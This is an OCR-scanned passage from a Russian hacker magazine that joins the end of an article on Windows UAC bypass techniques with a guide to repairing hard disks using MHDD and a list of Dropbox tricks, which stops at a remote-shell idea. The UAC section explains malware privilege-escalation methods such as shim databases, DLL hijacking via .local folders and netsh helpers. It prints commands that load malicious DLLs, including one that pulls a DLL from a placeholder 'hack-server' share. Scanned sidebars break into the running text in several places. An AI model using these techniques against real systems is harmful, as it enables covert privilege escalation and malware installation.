 нии которого мы поговорим сейчас.                              методов обхода UAC
                                                                                      от 0xfemale    Благодаря встроенным в UAC бэкдорам компьютеры
  с Windows 7 заражались незаметно для пользователя.                                                              UACMe — наиболее
 Они становились полигоном для малвари и частенько     полный сборник методов
 попадали в ботнеты. Один из них (под названием Simda)      обхода UAC от hfiref0x
 успешно развивался на протяжении пяти лет, используя
  для внедрения кода интерфейс ISecurityEditor. В Microsoft проблему частично
  устранили лишь в 2015 году. Исправленный ISecurityEditor стал работать толь-
  ко с объектами файловой системы, указанными в константе SE_FILE_OBJECT.
    Непропатченные системы встречаются до сих пор. Пример обхода UAC
  с использованием уязвимой версии ISecurityEditor приводится здесь.

 МЕТОД СИСТЕМНЫХ ЗАПЛАТОК
 Следующий способ обхода UAC был взят на вооружение хакерской группой
  Dridex. В нем используется метод системных заплаток (Shims), позволяющий
  запускать программы в режиме совместимости. В версиях Windows 7/8/8.1
  этот встроенный компонент был реализован с ошибками. Одна из них заклю-
  чалась в том, что можно создать собственную базу Shim DataBase, а в ней ука-
  зать ссылку на свой файл как на «исправленную» версию системного файла
  из белого списка. Таким образом можно запускать произвольный код, и UAC
  будет молчать.
    Поэтапно схема от Dridex выглядела так:
  1. Троян (*.exe) создает собственную базу *.sdb, пакетный файл *.bat и свою
    копию.
  2. Троян использует команду sdbinst для установки созданной базы .sdb в си-
     стему:

  sdbinst.exe –q %temp%\*.sdb

  3. Троян  запускает  утилиту  командной  строки
    iscsicli.  iSCSI-инициатор  получает  указание
    из *.sdb о том, что для дальнейшей работы требу-
     ется запустить *.bat.
  4. Пакетный файл запускается как дочерний процесс
    и наследует административные привилегии.
                                                        INFO  5. Аналогичным образом пакетный файл запускает
    копию трояна (созданную на первом шаге) и деле-                                                                        Некоторые методы
     гирует административные привилегии ей.                 обхода UAC используют
                                                                       внедрение своего кода в
                                                                       адресное пространство
 Схожий метод обхода UAC использует и BackDoor.                                                                              других процессов (в
  Gootkit. Сначала с помощью библиотеки apphelp.dll       частности, системных),
 он создает в заражаемой системе свою базу данных         а способы такого
                                                                         инжекта отличаются для  Shim. В ней через функцию RedirectEXE он указыва-                                                                        32-битных и 64-разрядных
  ет, что для программы сетевого клиента SQL Server       версий Windows. Из-за
  (cliconfg.exe) есть «исправленная» версия. В ка-        ограничений самого
                                                                       инструмента Shim DataBase  честве «исправленного» файла записывается ссыл-
                                                                       соответствующий метод
  ка на компонент трояна. Поскольку в манифесте                                                                         работает только в 32-битных
 cliconfg.exe мы также можем увидеть знакомые         версиях Windows.
  строки AutoElevate=true, UAC позволяет ему загру-
  зиться без лишних вопросов в Windows 7–8.1.
    Для работы с Shim DataBase есть готовый набор функций WinAPI в стан-
  дартной библиотеке apphelp.dll. Исходный код одной из реализаций метода
 Shim для обхода UAC приводится здесь.
    Методы использования Shim DataBase для обхода UAC подробно разбира-
  лись на конференции Black Hat 2015.

 СБОРКА БОК О БОК
 В Windows немало скрытых функций, и часть из них вполне можно считать бэк-
  дорами. Например, доставшие еще со времен ранних версий NT конфликты
 между общими библиотеками в современных версиях Windows решаются
 при помощи технологии «сборки бок о бок» (Side-by-side Assembly — SxS). Все
 ресурсы для общего использования объединяются в сборку и размещаются
  в системном каталоге \WinSxS\, который растет как на дрожжах.
    При каждой установке или обновлении программ и драйверов в него за-
  писывается новая сборка — подкаталог с уникальным (и длинным) именем,
 например таким: \wow64_microsoft-windows-powershell-exe_31bf3856ad3
 64e35_6.1.7600.16385_none_cd5f9aad50446c26\. В WinSxS всегда находят-
  ся десятки тысяч таких записей, и даже на SSD их список загружается несколь-
  ко секунд. Поэтому Windows не спешит обращаться к этому репозиторию.
 Для ускорения работы многие стандартные компоненты делают иначе — соз-
 дают копию нужных библиотек в своем временном подкаталоге общего вида
  *.local.
    Например, та же программа подготовки системы к развертыванию создает
  подкаталог %windir%\system32\sysprep.exe.local\ и, только если не най-
  дет нужных компонентов там, обратится в %windir%\WinSxS\.





                            Диспетчер процессов показывает создание каталога .local


  Такое предсказуемое поведение дает нам еще один вектор атаки: можно со-
  здать каталог \sysprep.exe.local\ и поместить в него свою версию библио-
  теки. В данном случае это будет comctrl32.dll. Подходящее имя библиотеки
 можно узнать, посмотрев манифест программы sysprep.exe. На использова-
 ние comctrl32.dll в нем указывает строка name="Microsoft.Windows.Common-
  Controls".
   В общем случае особенности работы с WinSxS и .local позволяют обойти
 UAC на многих версиях Windows — от 7 до 10.14955. Интересно, что сам «кон-
  троль учетных записей» подвержен той же самой уязвимости, от которой при-
  зван защищать. Мы можем не просто обойти UAC, а заставить его самого за-
  грузить нашу библиотеку тем же методом. Однако тут есть своя особенность.
    Основная часть кода UAC запускается и работает из %windir%\system32\
  appinfo.dll. Сам UAC запускается как процесс consent.exe. Начиная
  с Windows 7 он импортирует из той же библиотеки comctrl32.dll функцию
  TaskDialogIndirect(). Казалось бы, можно создать \consent.exe.local\
 и подсунуть UAC измененную библиотеку...
   В теории все верно, но на практике система часто зависает при попытке
  сделать такую подмену. Поэтому лучше сперва создать другой временный ка-
  талог (например, \consent.exe.tmp\), скопировать нашу DLL в него, а уже
  затем переименовать каталог в \consent.exe.local\. Затем надо заставить
 UAC запустить новый процесс consent.exe. Для этого можно вызвать лю-
 бой стандартный компонент, требующий повышенных привилегий. Например,
 «просмотр событий» — eventvwr.exe.
    После того как UAC загрузит подмененную библиотеку comctrl32.dll
 и выполнит вызов функции TaskDialogIndirect(), наш код запустится с пра-
 вами системы. Как только ловушка сработала — самое время передать управ-
 ление настоящей функции TaskDialogIndirect(), пока система не рухнула.


 Еще несколько лазеек в Windows

 Помимо распаковки DLL из архива CAB с помощью wusa, можно использовать
 и другие системные компоненты для копирования своих библиотек в систем-
 ные каталоги. Например, можно отправить их на печать и сохранить как файлы
 через стандартный интерфейс принтера printui.





      Интерфейс принтера позволяет сохранить любой код как файл в системном каталоге


 При помощи ключа реестра в этой ветке можно задать запуск любой програм-
 мы с правами администратора:

  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\
  AppCompatFlags\Layers





                                Запуск чего угодно от админа без подтверждения в UAC


 В домене UAC не реагирует на действия удаленного пользователя, если тот
  является локальным админом. Утилита PsExec Tool от Марка Руссиновича при
  старте с опцией –h скрыто запускает указанный экзешник на удаленной си-
  стеме. Для повышения его привилегий на чужом компьютере может исполь-
  зоваться локально хранимый токен. Готовый эксплоит для этого также есть в
  Metasploit, а сам метод подробно разбирается здесь.

    Иногда удобен быстрый способ внедрения своего кода через RunDll. В об-
 щем случае для этого достаточно отправить команду

  RUNDLL32.EXE \\hack-server\malware.dll,RunMalwareFunc

  Тогда системный компонент Rundll.exe сам выкачает указанную библиотеку
 malware.dll с самба-сервера \\hack-server\ и вызовет встроенную в нее
 функцию RunMalwareFunc().

   Еще одна утилита командной строки, помогающая тихо внедрить свой
  код, — сетевая оболочка netsh.exe. Для установки дополнительных DLL в
 ней есть встроенная функция add helper. Технически в качестве подгружае-
 мой библиотеки можно указать не только модуль поддержки network shell, но и
 свою DLL — лишь бы в ней была соответствующая функция InitHelperDll().
    Поэтому, если выполнить команду

  netsh.exe add helper %temp%\malware.dll

 наша  библиотека  malware.dll  зарегистрируется  в  ветке  реестра HKLM\
 SOFTWARE\Microsoft\Netsh. Она будет загружаться с правами системы и
 сможет делегировать их дочерним процессам.





                                     Запускаем калькулятор как системный процесс


 Вспомним еще один старый трюк. Он позволяет запустить консоль с права-
 ми уровня системы еще до входа в Windows. Для этого достаточно заменить
 компонент «Специальные возможности» (sethc.exe или utilman.exe — в за-
 висимости от версии ОС) на копию командного процессора cmd.exe. После
  такой замены при клике на ярлыке «Специальные возможности» вместо них
 прямо поверх экрана приветствия откроется консоль с наивысшими привиле-
  гиями. Подробнее об этом и других методах обхода ограничений Windows чи-
  тай в статье «Вскрываем Windows».



 ОБХОД UAC ВО ВРЕМЯ ТИХОЙ ОЧИСТКИ ДИСКА
 Начиная с Windows 8.1, Microsoft стала активно фиксить накопившиеся баги
  в реализации UAC. Поэтому одни механизмы обхода «контроля учетных за-
  писей» пришлось модифицировать, а другие — попросту забыть. Windows 10
 лишена многих недостатков, и старые трюки с ней обычно не прокатывают,
 но есть и новые!
   В планировщике задач Windows 10 по умолчанию включен сервис очистки
  диска — cleanmgr.exe. Он интересен нам тем, что может запускаться непри-
 вилегированными пользователями, но при этом сам имеет доступ ко всему
  диску. Через него даже простой юзер может получить доступ к системным ка-
  талогам и файлам. Если посмотреть настройки задачи SilentCleanup в пла-
  нировщике, то мы увидим флаг Run with Highest Privileges.
    При запуске cleanmgr.exe создает во временном каталоге пользователя
  подкаталог с именем уникального 128-битного идентификатора (GUID) и ко-
  пирует в него кучу библиотек. После этого он выполняет запуск DismHost.exe
  (все так же — с привилегиями высокого уровня), который подгружает эти би-
  блиотеки. Последней загружается LogProvider.dll, поэтому именно ее и стоит
 подменять своим кодом. Ключевая цель — успеть подменить библиотеку во
 временном каталоге пользователя после того, как ее запишет туда cleanmgr.
  exe, но раньше, чем ее загрузит DismHost.exe.


 Методы обхода UAC продолжают находить и сейчас, модифицируя старые
 приемы и открывая новые. Самое сложное — подобрать подходящие способы
 для конкретной атакуемой системы. Концептуально разных приемов известно
 с десяток, а если считать их вместе с модификациями и гибридными способа-
  ми, то наберется больше двадцати. Прочитать о них подробнее и посмотреть
 соответствующие примеры кода на GitHub можно по ссылкам в этой статье.



 В июле этого года Мэтт Грэбер (Matthew Graeber aka @mattifestation) и Мэтт
 Нельсон (Matt Nelson aka @enigma0x3) реализовали этот прием обхода UAC
  как PowerShell-скрипт.
    Сами авторы пишут, что метод работает со множеством ограничений.
 Он оказывается жизнеспособным только при запуске под админом в 32-раз-
 рядной ОС с настройками безопасности по умолчанию. Несмотря на великий
  соблазн, под юзером метод не работает, так как при таком запуске cleanmgr.
 exe не выполняет распаковку во временный каталог и в нем нечего подменять.
    Даже при соблюдении перечисленных выше условий эффект достигается
 лишь в том случае, если скрипт успеет подсунуть левую библиотеку во вре-
 менный каталог до появления там оригинальной DLL и если подменяемая би-
  блиотека по своей архитектуре сходна с LogProvider.dll... Но никто ведь
 не обещал, что будет легко!
PCZONE


НИЗКОУРОВНЕВЫЙ
 РЕМОНТ
     ЧИНИМ ЖЕСТКИЙ ДИСК С MHDD





                                         Алексей «Zemond»
                                              Панкратов,
                                              3em0nd@gmail.com




Disk boot failure, insert system disk and press
enter. Надпись, от которой по спине начи-
нается шествие легионов мурашек, каждая
сама размером с жесткий диск. По закону
подлости происходит это, когда ничто не      WWW
предвещает беды. Но не спеши судорожно       FAQ по MHDD на
                                                                       официальном
перезапускать систему — это игра в рус-               сайте
скую рулетку. Лучше загрузиться с другого                                                                          Документация
носителя и взяться за тщательную провер-         MHDD
ку. Поможет в этом испытанный инстру-
мент — MHDD.


Если SMART показывает проблемы, чаще всего это означает одно: диск вот-
вот начнет сыпаться, и повлиять может даже лишняя загрузка ОС. Следующее,
что нужно понять, — это софтверные на нем «бэды» или хардварные. Если
хардварных не так много, то диск еще можно попытаться вернуть к жизни.
   Думаю, ты слышал о таких продуктах, как MHDD и Victoria. Они незаменимы
для низкоуровневой работы с жестким диском и помогут тебе совершить ве-
ликие подвиги в восстановлении и диагностике. О Victoria «Хакер» уже писал
пару выпусков назад, теперь настало время разобраться со второй — архаич-
ной, но по-прежнему мегаполезной утилитой.
  MHDD — это небольшая, но мощная бесплатная программа, которая пред-
назначена для работы с накопителями на самом низком уровне (насколько
это возможно). Первая версия была выпущена Дмитрием Постриганем в 2000
году. Она могла сканировать поверхность накопителя с интерфейсом IDE в
режиме CHS. Сейчас MHDD — это значительно больше, чем диагностика. С
MHDD ты можешь делать все что угодно: диагностировать накопители, выпол-
нять чтение и запись произвольных секторов, управлять системой SMART, па-
рольной системой, системой управления шумовыми характеристиками, а так-
же изменять размер накопителя.
   Несмотря на то что работа с MHDD возможна и через установленную
Windows, я крайне рекомендую записать образ на флешку или внешний (или
второй загрузочный) диск и загрузить оттуда голый DOS. Поверь, в хардвар-
ном вопросе лучше максимально исключить все звенья цепи, которые могут
привести к глюкам или зависанию компьютера во время работы.

Ох уж эти интерфейсы

Не каждый интерфейс может корректно распознаваться программой.

SATA. Есть вероятность, что диск не определится в MHDD. Причина может за-
ключаться в режиме работы SATA-контроллера (IDE и AHCI) в BIOS. MHDD, увы,
не поддерживает режим AHCI. Необходимо менять настройки BIOS. Хуже всего
то, что нынче не все матплаты поддерживают этот режим. Выходом может стать
только использование машины с подходящей материнкой или отказ от MHDD.

IDE. Для данного интерфейса характерно распределение устройств на шлей-
фе — master/slave. По умолчанию MHDD скрывает все устройства в режиме
slave. Исправить это можно двумя способами. Первый — изменить располо-
жение жесткого диска (переключить перемычку на master) и проверить соот-
ветствие настройки в BIOS. Второй способ — попробовать в MHDD сменить
номер диска на 2 или 4. Ну и не забывай про конфигурационный файл mhdd.
cfg, который лежит в папке CFG. В данном случае важен параметр PRIMARY_
ENABLED=TRUE.

SCSI. Может не определиться драйвер SCSI-контроллера.

USB. Подключить диск через USB теоретически возможно с помощью допол-
нительного драйвера и настройки программы. Драйвер эмулирует режим ра-
боты через SCSI. Также необходимо отключить все лишние USB-накопители.
Целевой диск должен быть подключен до загрузки MHDD. В config.sys потребу-
ется прописать: device=X:\USBASPI.SYS /w /v, где X:\ — путь к диску.



Итак, я беру с полки один из сломанных дисков (я обычно клею на них этикетку
broken) и сейчас попробую воскресить его, чтобы показать тебе, как это рабо-
тает на практике. У меня на руках оказался винт WDC WD7500BPVX-60JC3T0 с
винегретом вместо системы и всех файлов на нем.





                                             SMART подопытного диска


Раз уж ситуация настолько печальна, я могу с чистой совестью форматировать
диск вдоль и поперек, что заметно упрощает мою задачу. Но для начала давай
разберемся с небольшой теорией и планом восстановления.
   Первоначально диск должен инициализироваться программой, что вполне
логично. После этого производится сканирование поверхности, которое дает
понимание текущего положения дел: MHDD покажет состояние поверхности
харда. Затем нужно будет отформатировать диск и провести проверку еще
раз. Обычно на этом этапе софт-бэды пропадают, и остаются только хардвар-
ные. Далее можно будет выполнить процедуру REMAP, чтобы бэд-блоки пере-
назначить в служебную область.
   Главная проблема в том, что служебная область не резиновая, и даже по-
сле всех операций за диском нужно смотреть. Если бэд-блоки продолжают по-
являться, то диск, как ни старайся, уже не жилец. Но в более удачных случаях
этот способ должен помочь. Как показывает практика, после ремапа диск мо-
жет проработать еще очень много времени и даже пережить соседей по кор-
зине. В другие разы он умирает сразу же после перезагрузки — тут уж как по-
везет, и предсказать эффект практически невозможно.
   Что ж, можно приступать к делу! Для начала создаем загрузочную флеш-
ку. Для этого я рекомендую USB Tools — полная инструкция и сам DOS есть
вот здесь. Когда носитель готов, остается только бросить в его корень MHDD,
чтобы лишний раз не лазить по директориям из командной строки.
   Чтобы диск, подключенный на первый канал, точно отображался, нужно
подредактировать конфиг mhdd.cfg, который лежит в папке CFG.

PRIMARY_ENABLED=TRUE

                            Не убий

                                          Угробить диск значительно
                                       проще, чем восстановить его.
                                     К примеру, каждому известно
                                            (или должно быть известно),
                                             что к печальным последствиям
                                          ведет отсоединение шлейфа
                                        во время работы. Также крайне
                                       не рекомендуем бездумно
                                         переключать флаги и выполнять
                                      команды в MHDD. Внимательно
                                           читай документацию и не
                                         начинай что-то делать, если до
                                         конца не понимаешь, к чему это
                                      может привести.



                         USB Tools


Как я уже говорил, сканирование любого устройства возможно, только если оно
определяется командами ID или EID (или нажатием F2).





                                                Определяем наш жесткий диск


Чтобы выполнить сканирование, набираем SCAN и жмем ENTER или использу-
ем F4. Появится меню, из которого можно изменить часть настроек. По умол-
чанию начальный сектор равен нулю (стартовый сектор). Конечный сектор
равен максимально возможному (конец диска). Все деструктивные по отноше-
нию к пользовательским данным функции (Remap, Erase Delays) по умолчанию
выключены.





                                                     Начинаем сканирование

Давай пройдемся по параметрам сканирования.
•  Start LBA — начальный сектор для сканирования, по
   дефолту 0, то есть начало диска.
• End LBA — сектор завершения сканирования, по де-
   фолту конец диска. Иногда удобнее сканировать не
   всю поверхность (особенно когда объем диска пере-
   валивает за несколько терабайт), а только рабочую         INFO
   область, где лежит ОС. К примеру, диск С равен 50
                                                                     Для FAT32 и NTFS
   Гбайт, тогда конечная область будет равна 2 × 50 ×                                                                              теоретические
   × 1024 × 1024 = 104 857 600-й сектор. Можно     ограничения по уровню
   посчитать проще: (объем × 2) × 1 000 000, итого    вложенности не указаны,
                                                                        но на практике они   100 000 000.                                                                         одинаковые: в каталоге
• Remap помечает сектор как сбойный в специальной      первого уровня можно
   служебной области, после чего диск к нему не обра-       создать только 7707
                                                                             подкаталогов. Любители   щается.                                                                             поиграть в матрешки
•  Timeout — время задержки на чтение сектора, по-             оценят.
   сле которого проверка переходит к следующему сек-
   тору.
•  Spindown after scan — остановить жесткий диск после сканирования.
•  Loop test/repair — проводить сканирование или проверку циклично.
•  Erase Delays — стирать сектора, в которых обнаружены задержки чтения.

Снова нажимаем F4 для запуска сканирования. MHDD сканирует накопители бло-
ками. Для накопителей IDE/SATA один блок равен 255 секторам (130 560 байт).





                                                        Процесс сканирования

)Вот как работает сканирование:
1. MHDD  посылает  команду  VERIFY
   SECTORS с номером LBA (номер сек-     Наличие красных (>500 ms)
   тора) и номером секторов в качестве     блоков на полностью здоро-
   параметров.                        вом накопителе недопусти-
2. Накопитель поднимает флаг BUSY.       мо. Если они есть, необхо-
3. MHDD запускает таймер.              димо произвести стирание
4. После того как накопитель выполнил      (erase)  всей  поверхности
   команду, он опускает флаг BUSY.        диска и, если это не помог-
5. MHDD вычисляет затраченное на-      ло, избавиться от задержек,
   копителем время и выводит соот-    можно делать выводы, что
   ветствующий блок на экран. Если     данный накопитель перестал
   встретилась ошибка (bad block), про-     быть достаточно надежным.
   грамма выводит букву, которая опи-     Буквенно-символьные  бло-
   сывает ошибку.                              ки, например x, S и т.п., не-
                                         допустимы: они  говорят о
MHDD повторяет шаги 1–5 до конечного     наличии bad-блоков на по-
сектора. Если нужен протокол сканиро-     верхности.
вания, его всегда можно найти в файле        Первое,   что   должно
log/mhdd.log. Во время сканирования ты     быть сделано, — это пол-
можешь увидеть много прямоугольни-     ная очистка поверхности ко-
ков разного цвета. Чтобы ты не сильно     мандой erase. Если это не
пугался, привожу выдержку из справки:       помогло, то scan с включен-
   Если сканирование выявило ошибки,     ной опцией EraseWaits. Если
первое, что необходимо сделать, — ско-     bad-блоки так и не исчез-
пировать все данные с накопителя (если      ли, следует запустить scan с
они, конечно, тебе нужны). В моем слу-     включенной опцией Remap.
чае это было неактуально. Затем нужно
полностью  очистить поверхность при
помощи команды ERASE, которая стира-
ет каждый сектор на накопителе.





                                                Выполнение команды ERASE


Накопитель пересчитает поля ECC для каждого сектора. Это помогает изба-
виться от так называемых soft-bad-блоков. Если стирание не помогло, запуска-
ем сканирование с включенной опцией REMAP.





                                                              Процесс ремапа

Если видишь, что каждый блок содержит ошибку, не пытайся стирать накопи-
тель или сканировать с включенной опцией REMAP. Скорее всего, у накопителя
повреждена служебная область, и это не может быть исправлено стандартными
командами MHDD.

О чем сигнализируют индикаторы

BUSY — накопитель занят и на команды не реагирует;
• WRFT — ошибка записи;
• DREQ — накопитель жаждет обменяться данными с внешним миром;
• ERR — возникла ошибка в результате какой-либо операции.

Когда загорается ERR, смотри в правую верхнюю часть экрана: там будет ото-
бражен тип последней ошибки:
• AMNF — Address Mark Not Found — обращение к какому-то конкретному
   сектору не удалось. Скорее всего, означает, что сектор поврежден. Однако
   сразу после включения накопителя как раз наоборот — свидетельствует об
   отсутствии проблем и сообщает об успешном выполнении внутренней диа-
   гностики;
•  T0NF — Track 0 Not Found — не найден нулевой трек;
•  ABRT — Abort, команда отвергнута;
•  IDNF — Sector ID Not found;
• UNCR — Uncorrectable Error, ошибка, не скорректированная кодом ECC.
   Скорее всего, в этом месте логический бэд-блок.

Вверху могут появляться еще два индикатора: PWD сигнализирует об установ-
ленном аппаратном пароле, HPА появляется в том случае, если размер нако-
пителя был изменен с помощью команды HPA (обычно используется для скры-
тия бэд-блоков в конце диска).




Внимательный читатель, посмотрев на картинки сканирования диска, веро-
ятно, присвистнул и сокрушенно покачал головой. Да, мой диск, пока я пи-
сал статью, умер окончательно. Количество хардварных бэдов превысило все
допустимые пределы, и к набиванию последних строк статьи он уже хрустел,
как трактор «Беларусь». Это к слову о том, что если диск начинает сыпаться,
то доверять ему нельзя, особенно если появляются хардварные бэды. Ремап
сможет помочь тогда, когда диск еще не начал активно сыпаться, но на по-
верхности возникли дефекты. В любом случае, даже если починить удалось,
используй такой диск только для некритичных данных и ни в коем случае не как
основной.
PCZONE
БОЛЬШЕ
ЧЕМ ДИСК
  10 ТРЮКОВ С DROPBOX





Кого сегодня удивишь облачным хранилищем? Многие
пользуются такими сервисами ежедневно. Однако любо-
му сервису хранения данных можно найти весьма неожи-
данные способы применения: для синхронизации настро-
ек между компьютерами, хранения заметок, удаленного
управления ПК, хостинга Git-репозиториев и многих дру-
гих, иногда совершенно неочевидных вещей.

Сервисов, которые позволяют хранить данные на облач-
ном диске, уже несколько сотен (ты, к примеру, когда-ни-
будь слышал о Seafile?). Однако в этой статье мы поговорим
о самом популярном и универсальном из них — Dropbox. Он
работает везде и на всем, его поддерживают тысячи прило-
                                                                                  Евгений Зобнин
жений и веб-аппов. А если у тебя нет аккаунта Dropbox, зна-       zobnin@gmail.com
чит, последние десять лет ты провел в криогенной камере.

1. ЛИЧНЫЙ ITUNES
Начнем с самого простого — хранения музыки. Для этой цели Dropbox подхо-
дит просто идеально: достаточно разместить MP3 в папке Dropbox на компью-
тере, а затем слушать на другой машине или мобильном устройстве с помо-
щью официального приложения или на сайте dropbox.com.
  Но у такого подхода свои проблемы.
Мобильная версия приложения Dropbox
для любой платформы просто не име-
ет функции автоматической синхрониза-
ции всего диска. Конечно, ты можешь по-
метить файл для офлайнового доступа,
но это придется делать для каждого тре-
ка по отдельности. А слушать музыку на-
прямую через клиент Dropbox — занятие
не только странное, но и ужасающе неу-
добное.
  В этой ситуации не помешает плеер
со встроенной поддержкой Dropbox. Та-
ких много. Если у тебя Android, установи
AirBeats или CloudPlayer. iOS? Твой вари-
ант — Jukebox. Windows Phone... мы не бу-
дем критиковать твой выбор, но приложе-
ние найдется и для тебя, оно называется
Smart Player.
   Все они умеют загружать информацию
о музыке из Dropbox, каталогизировать,
объединять в альбомы и даже прослуши-
вать в офлайне (заблаговременно ска-
чав). Если же ты очень ценишь свой люби-
                                                                            CloudPlayerмый плеер и не хочешь менять его, то есть
еще один способ (по крайней мере, если
ты юзер Android) — приложение Dropsync.
Это своего рода вариант настольной версии клиента Dropbox для смартфона.
Он автоматически синхронизирует облачный диск или отдельные папки с кар-
той памяти смартфона.

2. СИНХРОНИЗАЦИЯ КНИГ
И ПОЗИЦИИ ЧТЕНИЯ
Тот же самый Dropsync удобно использо-
вать для синхронизации архива книг меж-
ду компом и устройствами. Аналогичную
функцию поддерживают многие книгочи-
талки. Например, FBReader умеет сохра-
нять каждую открытую на устройстве кни-
гу в Dropbox или Google Drive, так что она
становится доступна на всех остальных
устройствах.
   Многие  книгочиталки,  включая  тот
же FBReader и Moon Reader, использу-
ют Dropbox для синхронизации позиции
чтения. Так что ты можешь начать читать
книгу на планшете дома, а продолжить
на смартфоне в метро.

3. СИНХРОНИЗАЦИЯ КОНФИГОВ
Допустим, у тебя есть несколько машин:
домашний комп, ноутбук и нетбук. На всех
установлена  одинаковая  операционка,
и ты хотел бы, чтобы настройки установ-
ленных приложений автоматически син-
хронизировались между всеми машинами.
   Если ты пользуешься macOS или Linux,                                                        Синхронизируем книги
то синхронизацию будет легко организо-
вать голыми руками. Достаточно пере-
нести файл настроек приложения в Dropbox, а затем создать на месте ори-
гинального файла ссылку на него внутри Dropbox. Например, синхронизация
настроек Bash выполняется в три команды:

$ mkdir ~/Dropbox/configs
$ mv ~/.bashrc ~/Dropbox/configs/
$ ln -s ~/Dropbox/configs/.bashrc ~/.bashrc

Если запустить эти три команды на машине-доноре, а последнюю на всех
остальных машинах (удалив в случае необходимости оригинальный конфиг), то
любые изменения настроек Bash автоматически синхронизируются с осталь-
ными машинами.
   Чтобы не заморачиваться с ручным переносом настроек, можно исполь-
зовать скрипт Mackup. Он поддерживает огромное количество приложений,
а все, что нужно сделать для синхронизации настроек, — это установить его.

$ brew install mackup // macOS
$ pip install mackup // Linux

Теперь включай синхронизацию.

$ mackup backup

Делает он то же самое, что описанные команды, то есть просто переносит на-
стройки в Dropbox. На новой, еще не синхронизированной машине следует
выполнить команду mackup restore.
  Но что, если ты используешь Windows? В этом случае все очень печально.
Тут приложения могут хранить настройки где угодно, начиная от своей папки
и заканчивая реестром, так что придется долго разбираться, где что лежит,
и копировать файлы руками.





                                                         Конфиги в Dropbox

4. ЗАМЕТКИ
Dropbox может  быть удобным местом
для хранения заметок. Не только пото-
му, что доступен с любого устройства,
но и потому, что править заметки мож-
но в своем любимом текстовом редак-
торе. На телефоне или планшете мо-
жешь, к примеру, использовать  Plain.txt
для Android или Drafts для iOS.
   Кстати,  пользователям  настольной
Windows будет не лишним сохранить пап-
ку «Документы» в Dropbox. Для этого надо
кликнуть на папке правой кнопкой мыши,
выбрать «Свойства» и указать путь внутри
папки Dropbox вместо стандартного пути.

5. ТОРРЕНТЫ
Любой популярный торрент-клиент под-
держивает   автоматический    подхват
torrent-файлов из указанной папки. На-
пример, в Transmission есть опция «Искать
торрент-файлы», позволяющая  выбрать
папку, torrent-файлы из которой будут ста-
виться в очередь на закачку. Естествен-
но, никто не запрещает разместить такую                                     Plain.txt
папку в Dropbox и добавлять в нее торрен-
ты со смартфона, находясь на другом кон-
це города.





                                                       Настройки Transmission

Полезности

На Dropbox завязаны многие онлайновые сервисы, приложения и расширения
для браузеров. Вот только некоторые из них:
•  Photoshoot — сервис для создания красивых галерей из сохраненных
   в Dropbox снимков.
•  QuickDrop — расширение Chrome для быстрой навигации по Dropbox.
•  WordPress Backup to Dropbox — плагин WordPress для сохранения бэкапов
   сайта в Dropbox.
•  Post via Dropbox — еще один плагин для WordPress. Позволяет публиковать
   посты в блог, создавая текстовые файлы в Dropbox.
•   Digify — сервис для расшаривания файлов с помощью Dropbox. Позволяет
    узнать, кто и когда просматривал файл, запретить копировать содержимое
   файла или делать его скриншот, ставить водяные знаки или запрещать па-
   ролем, устанавливать «срок годности» файлов.
•  SortMyBox — сервис сортировки файлов на основе множества различных
   критериев.


6. ПАРОЛИ
Большинство из нас используют менеджеры паролей. Кому-то достаточно
встроенной функции сохранения паролей в браузере, многие предпочитают
LastPass, другие не доверяют облакам и выбирают 1password или KeePassX
для хранения паролей на диске без синхронизации с другими машинами.
  В любом случае менеджеры паролей — это всегда компромисс. Либо ты от-
даешь пароли облачному хранилищу и надеешься, что его владельцы не сда-
дут тебя, либо миришься с неудобством копирования базы паролей на свои
устройства. Dropbox позволяет объединить плюсы обоих решений, ничего
не потеряв. Достаточно использовать локальный менеджер паролей, разме-
стить его базу в папке Dropbox и поставить на нее сложный пароль.
  В случае с KeePassX сделать это можно, выбрав меню «Хранилище   Со-
хранить хранилище как...» и указав файл внутри Dropbox. База будет синхро-
низирована со всеми твоими машинами, а благодаря AES-шифрованию со-
трудники Dropbox или те, кто получил доступ к твоему облачному диску, вряд
ли смогут расшифровать ее.





                                              Сохраняем базу паролей в Dropbox

7. ЗАШИФРОВАННОЕ ХРАНИЛИЩЕ
Пароли — не единственное, что можно и нужно хранить в Dropbox в зашиф-
рованном виде. Дело в том, что, несмотря на заявления компании о полном
шифровании пользовательских данных, это самое шифрование реализовано
на стороне сервера, а значит, все ключи для расшифровки хранятся там же.
В случае необходимости сотрудники Dropbox легко расшифруют твой диск
и отдадут эти данные кому надо (и тебе повезет, если это будет ФБР).
   Поэтому особо важную информацию лучше хранить в контейнере, зашиф-
рованном с использованием твоего ключа. Есть масса способов сделать это,
но если тебе нужно кросс-платформенное решение, то стоит обратить внима-
ние на VeraCrypt — наследника известного решения для создания шифрован-
ных томов TrueCrypt.
   Официально VeraCrypt доступен для Windows, Linux и macOS, но данные
в созданных им контейнерах можно открыть с помощью множества других при-
ложений, включая мобильные. Важнее всего, что том VeraCrypt очень легко со-
здать и подключить в качестве локального диска. Достаточно выбрать в меню
Create new volume, задать папку Dropbox в качестве места для сохранения
тома, указать алгоритм шифрования и подключить том.





                                                          Создаем контейнер

8. ЛИЧНЫЙ GITHUB
Системы контроля версий, изначально придуманные для координации работы
больших команд разработчиков, также очень хорошо подходят для управления
личными проектами (откат изменений, слияние веток, разработка модульных
приложений и прочие плюшки). Однако наиболее популярный сервис GitHub,
обслуживающий репозитории в формате не менее популярной системы Git,
не позволяет создавать личные закрытые репы бесплатно, а его аналогам за-
частую просто нельзя доверять.
   Выход — создать Git-репозиторий в Dropbox. Сделать это очень легко: соз-
даем в Dropbox папку для хранения репозиториев и инициализируем в ней пу-
стой репозиторий для своего проекта (в Windows все эти команды можно вы-
полнить с помощью git-bash):

$ mkdir ~/Dropbox/git
$ cd ~/Dropbox/git
$ git init --bare project.git

В папке с исходниками проекта создаем репозиторий и добавляем в него все
файлы:

$ git init
$ git add .
$ git commit -m "first commit"

Указываем в качестве origin репозиторий в Dropbox и push’им в него:

$ git remote add origin ~/Dropbox/git/project.git
$ git push -u origin master

Это все. Среда разработки автоматически подхватит настройки репозитория
и будет выполнять push в ~/Dropbox/git/project.git. Для получения доступа к ис-
ходникам с другой машины достаточно клонировать репозиторий:

$ git clone ~/Dropbox/git/project.git project


9. УДАЛЕННЫЙ SHELL
Это может показаться странным, но Dropbox вполне можно использовать
для выполнения удаленных команд в Linux. Для этого достаточно написать не-
большой скрипт, который будет ожидать изменения в определенном файле,
читать из него команду, выполнять ее, а результат записывать в другой файл.
Этот скрипт может выглядеть так:





